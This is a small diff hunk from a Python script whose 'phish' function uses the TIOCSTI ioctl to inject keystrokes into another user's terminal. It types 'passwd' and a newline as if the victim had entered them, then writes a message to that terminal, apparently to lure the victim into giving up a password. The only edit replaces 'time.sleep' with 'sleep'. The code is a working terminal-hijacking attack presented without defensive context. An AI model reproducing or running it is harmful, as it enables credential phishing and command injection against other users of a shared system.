@@ -15,7 +15,7 @@ def phish(tty):
    with open(tty) as f:
       for c in 'passwd\n'.decode('string_escape'):
          fcntl.ioctl(f,termios.TIOCSTI,c)
-   time.sleep(0.05) # I don't know really why, but without sleep it wont work.
+   sleep(0.05) # I don't know really why, but without sleep it wont work.
    with open(tty,'w') as f: 
       f.write(message)
       f.close()
